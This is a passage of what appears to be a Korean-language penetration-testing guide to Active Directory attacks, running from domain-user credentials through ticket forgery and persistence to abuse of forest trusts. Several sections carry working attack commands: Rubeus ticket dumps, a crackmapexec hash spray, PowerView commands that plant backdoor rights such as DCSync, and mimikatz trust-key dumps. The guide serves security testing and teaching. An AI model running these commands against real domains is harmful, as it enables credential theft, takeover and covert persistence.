그런 다음 복구한 gMSA를 다른 자격 증명과 마찬가지로 평가합니다. 로컬/도메인 그룹 멤버십, 로그온 권한, SPN, 위임 및 접근 가능한 서비스를 확인한 후 pass-the-hash를 시도하세요. 이 ACL 기반 조회 경로는 KDS root key가 유출된 후 관리형 암호를 유도하는 [Golden gMSA/dMSA](golden-dmsa-gmsa.md)와는 별개입니다.<sup>[[20]](#references)</sup>

컴퓨터 주체가 다른 컴퓨터 개체나 그룹을 제어할 수 있는 아웃바운드 권한을 가질 수도 있습니다. 컴퓨터 주체를 획득한 후에는 중첩 멤버십과 유효 ACL을 각각 확인하세요. 다른 컴퓨터 개체에 대한 쓰기 권한으로 계정을 변경할 수 있고, 그룹 멤버십 권한으로 로그온 역할을 얻을 수도 있습니다. 스테이징 계정 플래그, 예측 가능한 명명 규칙 또는 `GenericWrite` 엣지만으로는 전체 경로가 성립한다고 볼 수 없습니다.

파일, 공유 또는 백업에 저장된 `msDS-ManagedPassword` blob의 읽을 수 있는 사본은 별도의 노출 경로입니다. LDAP 읽기 ACL은 다른 곳에 저장된 사본을 보호할 수 없습니다. 데이터를 해석하기 전에 관리형 암호 blob인지 확인하고, 이 경우를 승인된 LDAP 읽기 및 KDS root key 유도를 통한 경우와 구별하세요.

### Kerberoast

Kerberoasting은 사용자 계정에 연결된 서비스가 사용하는 **TGS tickets**를 획득하고, 사용자 암호를 기반으로 한 암호화를 **오프라인**에서 크래킹하는 기법입니다.

자세한 내용은 다음을 참조하세요.


{{#ref}}
kerberoast.md
{{#endref}}

### 원격 연결 (RDP, SSH, FTP, Win-RM 등)

자격 증명을 획득한 후에는 **머신**에 접근할 수 있는지 확인할 수 있습니다. 이를 위해 포트 스캔 결과에 맞춰 **CrackMapExec**으로 여러 프로토콜을 사용해 여러 서버에 연결을 시도할 수 있습니다.

### 로컬 권한 상승

일반 도메인 사용자로서 자격 증명이나 세션을 확보했고 도메인의 **어떤 머신이든** 접근할 수 있다면, 로컬에서 **권한을 상승시키고 자격 증명을 수집할** 경로를 찾아보세요. 로컬 관리자 권한이 있으면 메모리(LSASS)와 로컬 저장소(SAM)에서 **다른 사용자의 해시를 덤프할** 수 있습니다.

이 책에는 [**Windows 로컬 권한 상승**](../windows-local-privilege-escalation/index.html)에 관한 전체 페이지와 [**체크리스트**](../checklist-windows-privilege-escalation.md)가 있습니다. [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)도 잊지 말고 사용하세요.

### 현재 세션 티켓

현재 사용자의 **티켓**이 예상치 못한 리소스에 **접근할 권한을 부여하는** 경우는 매우 **드물지만**, 다음과 같이 확인해 볼 수 있습니다:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

도메인 자격 증명이나 사용자 세션이 있다면 NTLM [**릴레이 공격**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)을 다시 살펴보세요. 인증된 열거 및 강제 인증 기법을 사용하면 인증되지 않은 정찰 단계에서는 찾을 수 없었던 릴레이 경로가 드러날 수 있습니다.

### 컴퓨터 공유에서 자격 증명 찾기 | SMB 공유

이제 기본적인 자격 증명을 얻었으니, **AD 내부에서 공유 중인 흥미로운 파일을 찾을 수 있는지** 확인해야 합니다. 수동으로 할 수도 있지만, 매우 지루하고 반복적인 작업입니다(확인해야 할 문서를 수백 개나 찾았다면 더 그렇습니다).

[**사용할 수 있는 도구를 알아보려면 이 링크를 따라가세요.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM 자격 증명 탈취

다른 PC나 공유에 **접근할 수 있다면**, 파일(예: SCF 파일)을 **배치**할 수 있습니다. 누군가 해당 파일에 접근하면 사용자를 상대로 NTLM 인증이 t**발생**하여, **크래킹을 위해** **NTLM 챌린지**를 **탈취**할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

이 취약점을 이용하면 인증된 사용자 누구나 **도메인 컨트롤러를 침해**할 수 있었습니다.


{{#ref}}
printnightmare.md
{{#endref}}

## 권한이 있는 자격 증명/세션으로 Active Directory 권한 상승

**다음 기법에는 일반 도메인 사용자 권한만으로는 부족하며, 공격을 수행하려면 특별한 권한이나 자격 증명이 필요합니다.**

### 해시 추출

[AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), 릴레이를 포함한 [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [로컬 권한 상승](../windows-local-privilege-escalation/index.html)을 통해 **일부 로컬 관리자 계정을 침해**하는 데 성공했기를 바랍니다.\
이제 메모리와 로컬에 있는 모든 해시를 덤프할 차례입니다.\
[**해시를 얻는 다양한 방법은 이 페이지를 참고하세요.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**사용자의 해시를 얻으면** 이를 사용해 해당 사용자를 **가장**할 수 있습니다.\
해당 **해시를 사용해** **NTLM 인증을 수행하는** **도구**를 사용하거나, 새 **sessionlogon**을 만들고 해당 **해시를** **LSASS에 주입**할 수 있습니다. 그러면 NTLM 인증이 수행될 때마다 해당 **해시가 사용됩니다.** mimikatz는 마지막 방법을 사용합니다.\
[**자세한 내용은 이 페이지를 참고하세요.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

이 공격은 일반적인 NTLM 프로토콜 기반 Pass The Hash를 대안으로, **사용자의 NTLM 해시를 사용해 Kerberos 티켓을 요청**하는 것을 목표로 합니다. 따라서 NTLM 프로토콜이 비활성화되고 인증 프로토콜로 **Kerberos만 허용되는** 네트워크에서 특히 **유용할 수 있습니다.**


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** 공격 방식에서 공격자는 사용자의 암호나 해시 값 대신 **사용자의 인증 티켓을 탈취**합니다. 이후 이 티켓을 사용해 **사용자를 가장**하고, 네트워크 내 리소스와 서비스에 무단으로 접근합니다.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### 자격 증명 재사용

로컬 **관리자 계정의 해시** 또는 **암호**가 있다면, 이를 사용해 다른 **PC에 로컬로 로그인**해 보세요.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> 참고로 이는 상당히 **noisy**하며 **LAPS**가 이를 **완화**할 수 있습니다.

### MSSQL 악용 및 Trusted Links

사용자에게 **MSSQL 인스턴스에 액세스**할 권한이 있다면, MSSQL 호스트가 SA로 실행 중인 경우 해당 호스트에서 **명령을 실행**하거나 NetNTLM **hash**를 **탈취**하거나 **relay attack**을 수행할 수도 있습니다.\
한 MSSQL 인스턴스가 다른 인스턴스의 데이터베이스 링크를 통해 신뢰되는 경우, 연결된 데이터베이스에 대한 권한이 있는 사용자는 **신뢰 관계를 이용해 다른 인스턴스에서 쿼리를 실행**할 수 있습니다. 이러한 신뢰 관계를 연쇄적으로 이용하면 결국 사용자가 명령을 실행할 수 있는 잘못 구성된 데이터베이스에 도달할 수도 있습니다.\
**데이터베이스 간 링크는 포리스트 신뢰 관계를 넘어 작동합니다.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 자산/배포 플랫폼 악용

타사 인벤토리 및 배포 제품군은 흔히 자격 증명과 코드 실행으로 이어지는 강력한 경로를 노출합니다. 다음을 참고하세요.

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 특성이 설정된 Computer 객체를 찾았고 해당 컴퓨터에 대한 도메인 권한이 있다면, 컴퓨터에 로그인하는 모든 사용자의 메모리에서 TGT를 덤프할 수 있습니다.\
따라서 **Domain Admin이 컴퓨터에 로그인하면** 그의 TGT를 덤프하고 [Pass the Ticket](pass-the-ticket.md)을 사용해 그를 가장할 수 있습니다.\
Constrained Delegation을 이용하면 **Print Server를 자동으로 장악**할 수도 있습니다(바라건대 해당 서버가 DC일 수 있습니다).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

사용자나 컴퓨터에 "Constrained Delegation"이 허용되어 있다면, **컴퓨터의 특정 서비스에 액세스하기 위해 모든 사용자를 가장**할 수 있습니다.\
따라서 이 사용자/컴퓨터의 **hash를 확보**하면 **모든 사용자**(도메인 관리자 포함)를 가장해 특정 서비스에 액세스할 수 있습니다.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

원격 컴퓨터의 Active Directory 객체에 대한 **WRITE** 권한이 있으면 **높은 권한**으로 코드를 실행할 수 있습니다:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 권한/ACL 악용

장악한 사용자에게 일부 도메인 객체에 대한 **유용한 권한**이 있을 수 있으며, 이를 통해 측면으로 이동하거나 권한을 **상승**할 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler 서비스 악용

도메인 내에서 **수신 대기 중인 Spool 서비스**를 발견하면 이를 **악용**해 **새 자격 증명을 획득**하고 **권한을 상승**할 수 있습니다.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 타사 세션 악용

**다른 사용자**가 **장악한** 컴퓨터에 **액세스**하는 경우, **메모리에서 자격 증명을 수집**하고 해당 사용자를 가장하기 위해 프로세스에 **beacon을 주입**할 수도 있습니다.\
일반적으로 사용자는 RDP를 통해 시스템에 액세스하므로, 다음은 타사 RDP 세션을 대상으로 몇 가지 공격을 수행하는 방법입니다:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**는 도메인에 가입된 컴퓨터의 **로컬 Administrator 암호**를 관리하는 시스템으로, 암호가 **무작위로 생성**되고 고유하며 자주 **변경**되도록 합니다. 이 암호는 Active Directory에 저장되며, ACL을 통해 권한이 부여된 사용자만 액세스할 수 있습니다. 이 암호에 액세스할 충분한 권한이 있으면 다른 컴퓨터로 피벗할 수 있습니다.


{{#ref}}
laps.md
{{#endref}}

### 인증서 탈취

장악한 컴퓨터에서 **인증서를 수집**하면 환경 내에서 권한을 상승할 수 있습니다:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### 인증서 템플릿 악용

**취약한 템플릿**이 구성되어 있다면 이를 악용해 권한을 상승할 수 있습니다:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 높은 권한 계정을 이용한 사후 공격

### 도메인 자격 증명 덤프

**Domain Admin**, 또는 더 높은 **Enterprise Admin** 권한을 획득하면 **도메인 데이터베이스**인 _ntds.dit_를 **덤프**할 수 있습니다.

[**DCSync attack에 대한 자세한 정보는 여기에서 확인할 수 있습니다**](dcsync.md).

[**NTDS.dit를 탈취하는 방법에 대한 자세한 정보는 여기에서 확인할 수 있습니다**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

`ntds.dit`와 `SYSTEM` hive가 함께 포함된 읽을 수 있는 백업 아카이브는 추출 전이라도 노출된 디렉터리 자료로 간주해야 합니다. 오래된 password hash가 있다고 해서 다른 객체 특성까지 안전한 것은 아닙니다. `description` 같은 필드에 자격 증명이나 운영 메모가 포함될 수 있습니다. 먼저 아카이브의 멤버 이름을 확인하고, 추출한 데이터베이스 내용이 일반적인 열거 결과에 포함되지 않도록 하세요.

### 지속성을 위한 Privesc

앞서 설명한 일부 기법은 지속성을 확보하는 데 사용할 수 있습니다.\
예를 들면 다음과 같습니다.

- 사용자를 [**Kerberoast**](kerberoast.md)에 취약하게 만들기

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- 사용자를 [**ASREPRoast**](asreproast.md)에 취약하게 만듭니다

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- 사용자에게 [**DCSync**](#dcsync) 권한 부여

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack**는 **NTLM hash**(예: **PC 계정의 hash**)를 사용해 특정 서비스에 대한 **정상적인 Ticket Granting Service (TGS) ticket**을 생성합니다. 이 방법은 **서비스 권한에 액세스**하는 데 사용됩니다.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**은 공격자가 Active Directory (AD) 환경에서 **krbtgt 계정의 NTLM hash**에 액세스하는 공격입니다. 이 계정은 AD 네트워크 내 인증에 필수적인 모든 **Ticket Granting Ticket (TGT)**에 서명하는 데 사용되므로 특별합니다.

공격자는 이 hash를 얻으면 원하는 모든 계정의 **TGT**를 만들 수 있습니다(Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

이는 **일반적인 golden ticket 탐지 메커니즘을 우회하는** 방식으로 위조한 golden ticket과 유사합니다.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**계정의 certificates를 보유하거나 이를 요청할 수 있다면**, 사용자가 비밀번호를 변경하더라도 해당 사용자 계정에 지속적으로 액세스할 수 있는 매우 좋은 방법입니다:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**certificates를 사용하면 도메인 내에서 높은 권한을 유지하는 것도 가능합니다:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory의 **AdminSDHolder** 객체는 **Domain Admins 및 Enterprise Admins**와 같은 **권한 있는 그룹**에 표준 **Access Control List (ACL)**을 적용해 무단 변경을 방지합니다. 하지만 이 기능은 악용될 수 있습니다. 공격자가 AdminSDHolder의 ACL을 수정해 일반 사용자에게 모든 권한을 부여하면, 해당 사용자는 모든 권한 있는 그룹을 광범위하게 제어할 수 있습니다. 보호를 목적으로 한 이 보안 조치가 면밀히 모니터링되지 않으면 오히려 부당한 액세스를 허용하는 결과를 낳을 수 있습니다.

[**AdminDSHolder Group에 대한 자세한 정보는 여기에서 확인하세요.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

모든 **Domain Controller (DC)**에는 **local administrator** 계정이 있습니다. 해당 컴퓨터에서 관리자 권한을 얻으면 **mimikatz**를 사용해 로컬 Administrator hash를 추출할 수 있습니다. 그런 다음 레지스트리를 수정해 **이 비밀번호를 사용할 수 있도록 설정**하면 로컬 Administrator 계정에 원격으로 액세스할 수 있습니다.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

특정 도메인 객체에 대해 **사용자에게** 일부 **특수 권한을 부여**해 두면, 해당 사용자는 **나중에 권한을 상승**시킬 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptor**는 **객체가** 다른 **객체에 대해 보유한** **권한을 저장**하는 데 사용됩니다. 객체의 **security descriptor를 조금만 변경**해도 권한 있는 그룹의 구성원이 되지 않고 해당 객체에 대해 매우 흥미로운 권한을 얻을 수 있습니다.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class를 악용해 `entryTTL`/`msDS-Entry-Time-To-Die`를 사용하여 수명이 짧은 principal/GPO/DNS record를 생성합니다. 이 객체들은 tombstone 없이 자체 삭제되어 LDAP 증거를 지우지만, 고아 SID, 손상된 `gPLink` 참조 또는 캐시된 DNS 응답은 남깁니다(예: AdminSDHolder ACE 오염 또는 악성 `gPCFileSysPath`/AD 통합 DNS 리디렉션).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

메모리에서 **LSASS**를 변경해 **범용 비밀번호**를 설정하고 모든 도메인 계정에 액세스할 수 있도록 합니다.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider)가 무엇인지 여기에서 알아보세요.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
자체 **SSP**를 만들어 컴퓨터에 액세스하는 데 사용되는 **자격 증명을** **평문으로 캡처**할 수 있습니다.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD에 **새 Domain Controller**를 등록하고 이를 사용해 지정된 객체에 **속성**(SIDHistory, SPNs...)을 **푸시**합니다. 이때 **변경 사항에 관한 로그는** 남지 않습니다. **DA 권한**이 있어야 하며 **root domain** 내에 있어야 합니다.\
잘못된 데이터를 사용하면 매우 좋지 않은 로그가 남을 수 있습니다.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

앞서 **LAPS 비밀번호를 읽을 권한이 충분한 경우** 권한을 상승시키는 방법을 살펴봤습니다. 하지만 이러한 비밀번호는 **지속성을 유지하는 데에도** 사용할 수 있습니다.\
확인하세요:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft는 **Forest**를 보안 경계로 간주합니다. 이는 **단일 도메인의 침해가 전체 Forest의 침해로 이어질 수 있음**을 의미합니다.<sup>[[1]](#references)</sup>

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)는 한 **도메인**의 사용자가 다른 **도메인**의 리소스에 액세스할 수 있도록 하는 보안 메커니즘입니다. 이는 두 도메인의 인증 시스템을 연결해 인증 검증이 원활하게 이루어지도록 합니다. 도메인 간 trust를 설정하면 각 도메인은 trust의 무결성에 중요한 특정 **키**를 서로 교환하고 보유합니다. 이 키는 각 도메인의 **Domain Controller (DC)**에 저장됩니다.

일반적인 경우, 사용자가 **trusted domain**의 서비스에 액세스하려면 먼저 자신의 도메인 DC에 특수 ticket인 **inter-realm TGT**를 요청해야 합니다. 이 TGT는 두 도메인이 합의한 공유 **키**로 암호화됩니다. 그런 다음 사용자는 이 TGT를 **trusted domain의 DC**에 제시해 서비스 ticket (**TGS**)을 받습니다. trusted domain의 DC가 inter-realm TGT를 성공적으로 검증하면 TGS를 발급해 사용자에게 해당 서비스에 대한 액세스 권한을 부여합니다.

**단계**:

1. **Domain 1**의 **client computer**가 자신의 **NTLM hash**를 사용해 **Domain Controller (DC1)**에 **Ticket Granting Ticket (TGT)**을 요청하면서 절차를 시작합니다.
2. 클라이언트 인증이 성공하면 DC1은 새 TGT를 발급합니다.
3. 그런 다음 클라이언트는 **Domain 2**의 리소스에 액세스하는 데 필요한 **inter-realm TGT**를 DC1에 요청합니다.
4. inter-realm TGT는 양방향 도메인 trust 설정의 일부로 DC1과 DC2가 공유하는 **trust key**로 암호화됩니다.
5. 클라이언트는 inter-realm TGT를 **Domain 2의 Domain Controller (DC2)**에 전달합니다.
6. DC2는 공유 trust key를 사용해 inter-realm TGT를 검증하고, 유효하면 클라이언트가 액세스하려는 Domain 2의 서버에 대한 **Ticket Granting Service (TGS)**를 발급합니다.
7. 마지막으로 클라이언트는 이 TGS를 서버에 제시해 Domain 2의 서비스에 액세스합니다. 이 TGS는 서버 계정 hash로 암호화됩니다.

### Different trusts

**trust는 단방향일 수도 있고 양방향일 수도 있습니다.** 양방향 trust에서는 두 도메인이 서로를 신뢰하지만, **단방향** trust 관계에서는 한 도메인이 **trusted**이고 다른 도메인이 **trusting**입니다. 후자의 경우 **trusted domain에서 trusting domain의 리소스에만 액세스할 수 있습니다**.

Domain A가 Domain B를 신뢰한다면, A는 trusting domain이고 B는 trusted domain입니다. 또한 **Domain A**에서는 이를 **Outbound trust**라고 하며, **Domain B**에서는 **Inbound trust**라고 합니다.

**다양한 trust 관계**

- **Parent-Child Trusts**: 같은 forest에서 흔히 사용되는 구성입니다. child domain은 parent domain과 자동으로 양방향 transitive trust를 맺습니다. 즉, parent와 child 간에 인증 요청이 원활하게 오갈 수 있습니다.
- **Cross-link Trusts**: "shortcut trusts"라고도 하며 child domain 간에 referral 절차를 단축하기 위해 설정합니다. 복잡한 forest에서는 인증 referral이 일반적으로 forest root까지 올라간 다음 대상 도메인으로 내려가야 합니다. cross-link를 만들면 이 경로가 짧아지므로, 지리적으로 분산된 환경에서 특히 유용합니다.
- **External Trusts**: 서로 관련이 없는 다른 도메인 간에 설정되며 기본적으로 non-transitive입니다. [Microsoft 문서](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)에 따르면 external trust는 forest trust로 연결되지 않은 현재 forest 외부 도메인의 리소스에 액세스할 때 유용합니다. external trust는 SID filtering을 통해 보안을 강화합니다.
- **Tree-root Trusts**: forest root domain과 새로 추가된 tree root 간에 자동으로 설정되는 trust입니다. 흔히 볼 수 있는 유형은 아니지만, 새 도메인 트리를 forest에 추가하고 고유한 도메인 이름과 양방향 transitivity를 유지하는 데 중요합니다. 자세한 내용은 [Microsoft 가이드](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)를 참조하세요.
- **Forest Trusts**: 두 forest root domain 간의 양방향 transitive trust이며, 보안 강화를 위해 SID filtering도 적용합니다.
- **MIT Trusts**: Windows가 아닌 [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos 도메인과 설정하는 trust입니다. MIT trust는 보다 특수한 유형으로, Windows 생태계 외부의 Kerberos 기반 시스템과 통합해야 하는 환경에 적합합니다.

#### **trust 관계의 다른 차이점**

- trust 관계는 **transitive**일 수도 있습니다(A가 B를 신뢰하고 B가 C를 신뢰하면 A도 C를 신뢰함). 또는 **non-transitive**일 수 있습니다.
- trust 관계는 **양방향 trust**(서로 신뢰) 또는 **단방향 trust**(한쪽만 상대를 신뢰)로 설정할 수 있습니다.

### Attack Path

1. trusting 관계를 **열거**합니다.
2. **security principal**(user/group/computer)이 다른 도메인의 리소스에 **액세스**할 수 있는지 확인합니다. ACE 항목이나 다른 도메인의 그룹 구성원 여부를 확인할 수 있습니다. **도메인 간 관계**를 찾아보세요(아마도 이를 위해 trust를 설정했을 것입니다).
   1. 이 경우 kerberoast도 또 다른 선택지가 될 수 있습니다.
3. 도메인 간에 **pivot**할 수 있는 **계정**을 **침해**합니다.

공격자는 다음 세 가지 주요 메커니즘을 통해 다른 도메인의 리소스에 액세스할 수 있습니다.

- **Local Group Membership**: principal이 서버의 “Administrators” 그룹과 같은 컴퓨터의 로컬 그룹에 추가되어 해당 컴퓨터를 폭넓게 제어할 수 있습니다.
- **Foreign Domain Group Membership**: principal은 외부 도메인의 그룹 구성원이 될 수도 있습니다. 다만 이 방법의 효과는 trust의 유형과 그룹의 범위에 따라 달라집니다.
- **Access Control Lists (ACLs)**: principal을 **ACL**에 지정할 수 있습니다. 특히 **DACL** 내 **ACE**의 주체로 지정하면 특정 리소스에 액세스할 수 있습니다. ACL, DACL, ACE의 작동 방식을 자세히 알아보려면 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 백서가 매우 유용합니다.<sup>[[17]](#references)</sup>

### 권한이 있는 외부 사용자/그룹 찾기

**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**을 확인하면 도메인의 foreign security principal을 찾을 수 있습니다. 이는 **외부 도메인/forest**의 user/group입니다.

**Bloodhound**에서 확인하거나 powerview를 사용할 수 있습니다:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

도메인 트러스트를 열거하는 다른 방법:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> 신뢰 키는 **2개**입니다. 하나는 _Child --> Parent_용이고, 다른 하나는 _Parent_ --> _Child_용입니다.\
> 현재 도메인에서 사용하는 키는 다음 명령으로 확인할 수 있습니다:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection을 악용해 자식/부모 도메인에 대한 신뢰를 이용하여 Enterprise admin 권한으로 상승합니다.


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 쓰기 가능한 Configuration NC 악용

Active Directory(AD) 환경에서 Configuration Naming Context(NC)를 어떻게 악용할 수 있는지 이해하는 것은 매우 중요합니다. Configuration NC는 포리스트 전반의 구성 데이터를 저장하는 중앙 저장소입니다. 이 데이터는 포리스트 내 모든 Domain Controller(DC)에 복제되며, 쓰기 가능한 DC는 Configuration NC의 쓰기 가능한 복사본을 유지합니다. 이를 악용하려면 DC, 가급적이면 자식 DC에서 **SYSTEM 권한**을 보유해야 합니다.

**GPO를 루트 DC 사이트에 연결**

Configuration NC의 Sites 컨테이너에는 AD 포리스트 내 도메인 가입 컴퓨터의 사이트 정보가 포함되어 있습니다. 공격자는 DC에서 SYSTEM 권한으로 작업하여 GPO를 루트 DC 사이트에 연결할 수 있습니다. 이 작업은 해당 사이트에 적용되는 정책을 조작하여 루트 도메인을 침해할 가능성이 있습니다.

자세한 내용은 [SID Filtering 우회](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)에 관한 연구를 참조하세요.<sup>[[12]](#references)</sup>

**포리스트 내 모든 gMSA 침해**

공격 벡터 중 하나는 도메인 내 권한이 높은 gMSA를 표적으로 삼는 것입니다. gMSA의 암호를 계산하는 데 필수적인 KDS Root key는 Configuration NC에 저장됩니다. DC에서 SYSTEM 권한이 있으면 KDS Root key에 접근하여 포리스트 내 모든 gMSA의 암호를 계산할 수 있습니다.

자세한 분석과 단계별 안내는 다음을 참조하세요.


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

보완적인 위임 MSA 공격(BadSuccessor – migration attributes 악용):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

추가 외부 연구: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema 변경 공격**

이 방법을 사용하려면 인내심을 갖고 새로운 권한 있는 AD 객체가 생성될 때까지 기다려야 합니다. SYSTEM 권한이 있으면 공격자는 AD Schema를 수정하여 모든 사용자에게 모든 클래스에 대한 완전한 제어 권한을 부여할 수 있습니다. 이를 통해 새로 생성된 AD 객체에 대한 무단 접근 및 제어가 가능해질 수 있습니다.

자세한 내용은 [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)를 참조하세요.<sup>[[14]](#references)</sup>

**ADCS ESC5로 DA에서 EA로 권한 상승**

ADCS ESC5 취약점은 Public Key Infrastructure(PKI) 객체에 대한 제어 권한을 악용해 포리스트 내 모든 사용자로 인증할 수 있는 인증서 템플릿을 만드는 공격입니다. PKI 객체는 Configuration NC에 있으므로, 쓰기 가능한 자식 DC를 침해하면 ESC5 공격을 실행할 수 있습니다.

자세한 내용은 [ESC5로 DA에서 EA로 권한 상승](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)에서 확인할 수 있습니다.<sup>[[15]](#references)</sup> ADCS가 없는 환경에서도 공격자는 필요한 구성 요소를 설정할 수 있습니다. 자세한 내용은 [자식 도메인 관리자에서 Enterprise Admin으로 권한 상승](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)을 참조하세요.<sup>[[16]](#references)</sup>

### 외부 포리스트 도메인 - 단방향(인바운드) 또는 양방향

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

이 시나리오에서는 **외부 도메인이 사용자의 도메인을 신뢰**하며, 외부 도메인에 대해 **권한이 명확하지 않은 상태**입니다. 사용자 도메인의 어떤 principal이 외부 도메인에 어떤 액세스 권한을 갖는지 파악한 다음 이를 악용해야 합니다:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 외부 포리스트 도메인 - 단방향 (아웃바운드)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

이 시나리오에서 **your domain**은 **다른 도메인**의 principal에 일부 **권한**을 **위임하는(trusting)** 관계입니다.

